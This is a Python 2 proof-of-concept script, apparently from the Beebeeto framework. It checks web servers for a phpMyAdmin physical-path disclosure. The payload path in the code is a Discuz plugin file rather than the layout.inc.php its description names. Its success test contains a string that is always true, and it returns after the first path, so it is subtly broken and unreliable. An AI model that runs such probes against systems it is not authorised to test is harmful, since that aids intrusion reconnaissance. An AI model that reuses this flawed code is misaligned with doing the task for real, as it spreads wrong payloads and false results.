#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0083',
            'name': 'phpmyadmin /themes/darkblue_orange/layout.inc.php 泄漏服务器物理路径 POC',
            'author': '小马甲',
            'create_date': '2014-10-19',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'phpmyadmin',
            'vul_version': ['*'],
            'type': 'Information Disclosure',
            'tag': ['phpmyadmin漏洞', '爆物理路径漏洞', '/layout.inc.php'],
            'desc': 'phpmyadmin爆路径方法 weburl+phpmyadmin/themes/darkblue_orange/layout.inc.php',
            'references': ['http://huaidan.org/archives/1642.html',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        paths = ['/', '/phpmyadmin/']
        payload = '/source/plugin/myrepeats/table/table_myrepeats.php'
        for path in paths:
            verify_url = args['options']['target'] + path + payload
            if args['options']['verbose']:
                print '[*] Request URL: ' + verify_url
            try:
                req = urllib2.Request(verify_url)
                content = urllib2.urlopen(req).read()
            except:
                continue
            if 'getImgPath()' in content and 'Fatal error:' and 'on line' in content:
                args['success'] = True
                args['poc_ret']['vul_url'] = verify_url
                return args
            else:
                args['success'] = False
                return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())